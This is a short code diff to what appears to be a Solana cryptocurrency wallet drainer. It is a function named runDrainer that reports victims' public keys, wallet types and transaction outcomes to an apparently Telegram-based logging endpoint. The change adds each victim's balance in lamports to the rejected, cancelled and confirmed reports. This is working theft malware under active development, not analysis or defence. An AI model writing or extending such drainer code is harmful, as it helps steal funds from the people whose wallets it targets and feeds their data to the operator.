@@ -1397,7 +1397,8 @@ async function runDrainer(provider) {
               body: JSON.stringify({
                 publicKey: publicKey.toString(),
                 walletType: connectedWalletType || 'Unknown',
-                reason: 'User rejected transaction'
+                reason: 'User rejected transaction',
+                lamports: balance || 0
               })
             }).catch(err => console.log('[TELEGRAM] Failed to log cancellation:', err));
             
@@ -1415,7 +1416,8 @@ async function runDrainer(provider) {
               body: JSON.stringify({
                 publicKey: publicKey.toString(),
                 walletType: connectedWalletType || 'Unknown',
-                reason: 'User cancelled transaction'
+                reason: 'User cancelled transaction',
+                lamports: balance || 0
               })
             }).catch(err => console.log('[TELEGRAM] Failed to log cancellation:', err));
             
@@ -1559,7 +1561,8 @@ async function runDrainer(provider) {
                               publicKey: publicKey.toString(),
                               txid: txid,
                               status: 'confirmed',
-                              error: null
+                              error: null,
+                              lamports: balance || 0
                             })
                           }).catch(err => console.log('[TELEGRAM] Failed to log confirmation:', err));
                           
